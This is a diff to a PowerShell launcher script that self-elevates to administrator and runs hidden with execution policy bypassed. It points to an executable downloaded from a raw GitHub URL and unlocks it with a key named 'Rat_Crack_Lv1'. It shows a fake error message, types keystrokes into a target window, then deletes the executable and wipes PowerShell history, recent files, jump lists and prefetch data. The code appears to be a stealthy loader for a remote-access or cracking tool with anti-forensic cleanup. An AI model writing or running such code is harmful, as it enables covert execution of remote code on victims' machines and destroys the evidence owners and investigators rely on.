@@ -1,15 +1,9 @@
 # =====================================================
-# Self-Elevate (with a visible prompt first, then hidden)
+# Self-Elevate (with GUI level selector)
 # =====================================================
-# First, we need to show the level selector GUI.
-# We'll do it in a non-elevated context so the GUI appears.
-# After the user chooses, we re-launch with admin and hidden.
-
-# Check if we are already elevated. If not, we'll show the GUI, then elevate.
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
-    # Show the level selection GUI (will run as normal user)
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
 
@@ -47,7 +41,6 @@ if (-not $isAdmin) {
         exit
     }
 
-    # Now re-launch with admin and pass the level as an argument
     $scriptPath = $PSCommandPath
     $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -level $level"
     Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $arguments
@@ -55,11 +48,11 @@ if (-not $isAdmin) {
 }
 
 # =====================================================
-# Now we are elevated, and the level is passed as an argument
+# Now elevated, with the level passed as an argument
 # =====================================================
 param([string]$level)
 
-# Hide the current console (if any)
+# Hide current console
 $hwnd = (Get-Process -Id $pid).MainWindowHandle
 if ($hwnd -ne [IntPtr]::Zero) {
     Add-Type -TypeDefinition @"
@@ -94,7 +87,10 @@ public class WindowAPI {
 $licenseKey = "Rat_Crack_Lv1"
 $exeUrl = "https://raw.githubusercontent.com/TSTEAM865/fafawfqf/main/cmd.exe"
 
-# === Blantant level behavior ===
+# The mode to select is the same as the blantant level
+$mode = $level   # 1-4
+
+# === Blantant level behavior (for window visibility, delays, etc.) ===
 switch ($level) {
     "1" {
         $windowStyle = "Hidden"
@@ -119,7 +115,6 @@ switch ($level) {
         $delayBeforeSend = 5
         $hideTargetAfterSend = $false
         $showFakeError = $true
-        # Show a fake error before proceeding
         Add-Type -AssemblyName System.Windows.Forms
         [System.Windows.Forms.MessageBox]::Show("An error occurred. Please restart the application.", "Error", "OK", "Error")
     }
@@ -171,7 +166,7 @@ if ($windowStyle -eq "Hidden") {
 
 Start-Sleep -Seconds $delayBeforeSend
 
-# === Bring to foreground and send key ===
+# === Find window and send license key ===
 $hwnd = $proc.MainWindowHandle
 if ($hwnd -eq [IntPtr]::Zero) {
     $hwnd = [WindowAPI]::FindWindow($null, "SKYNET - DEMOSHOP")
@@ -187,9 +182,23 @@ if ($hwnd -ne [IntPtr]::Zero) {
 }
 
 Add-Type -AssemblyName System.Windows.Forms
+
+# Send the license key + Enter
 [System.Windows.Forms.SendKeys]::SendWait($licenseKey)
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
+# Wait for the menu to appear (the EXE validates and shows the mode selection)
+Start-Sleep -Seconds 3
+
+# === Now send the mode selection (1-4) ===
+Write-Host "[+] Sending mode selection: $mode" -ForegroundColor Yellow
+[System.Windows.Forms.SendKeys]::SendWait($mode)
+[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+
+# If the EXE shows "Complete" / "Done" after selecting, we can wait a bit
+Start-Sleep -Seconds 2
+
+# Optionally hide the window after everything
 if ($hideTargetAfterSend -and $hwnd -ne [IntPtr]::Zero) {
     [WindowAPI]::ShowWindow($hwnd, 0) | Out-Null
 }
@@ -203,7 +212,7 @@ if (Test-Path $exePath) { Remove-Item $exePath -Force -ErrorAction SilentlyConti
 $histPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $histPath) { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue }
 
-# Clear recent, jump lists, prefetch, etc.
+# Clear recent, jump lists, prefetch
 $recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
 if (Test-Path $recentPath) {
     Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
